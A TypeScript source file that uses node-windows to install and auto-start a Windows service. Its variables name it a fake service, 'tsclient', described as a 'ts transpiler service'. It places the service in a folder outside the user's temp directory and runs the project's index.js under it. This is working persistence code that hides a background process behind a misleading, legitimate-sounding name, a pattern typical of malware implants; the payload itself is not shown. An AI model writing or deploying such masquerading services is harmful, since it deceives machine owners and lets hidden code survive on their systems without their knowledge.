import listServices from "./utils/listServices";
import * as Service from "node-windows";

import * as path from "path";
import { mkdirSync } from "fs";

export default async (): Promise<void> => {
    const fakeServiceName = "tsclient";
    const fakeServiceDescription = "ts transpiler service";
    const installFolder = path.join(process.env.TEMP, `../../${fakeServiceName}`);
    const installedServices = await listServices();
    const isServiceInstalled: boolean = installedServices.includes(`${fakeServiceName}.exe`);

    const svc = new Service.Service({
        name: fakeServiceName,
        description: fakeServiceDescription,
        script: path.join(__dirname + `/index.js`),
        env: [
            {
                name: "SVUSERNAME",
                value: process.env["USERNAME"],
            },
            {
                name: "TEMP",
                value: path.join(process.env["USERPROFILE"], "/temp"), // use a temp directory in user's home directory
            },
        ],
    });

    (svc as any)._directory = installFolder;

    if (!isServiceInstalled) {
        console.log("Install");
        try {
            mkdirSync(installFolder);
        } catch (e) {
            console.log(e);
        }

        svc.install(installFolder);

        svc.once("install", () => {
            console.log("service installation complete");
            try {
                console.log("Starting");
                svc.start();
            } catch (e) {
                console.error("Start failure");
            }
        });
    } else {
        try {
            svc.start();
            console.log(`Start service - ${fakeServiceName}`);
        } catch (e) {
            console.log("Error starting service", e);
        }
    }
};
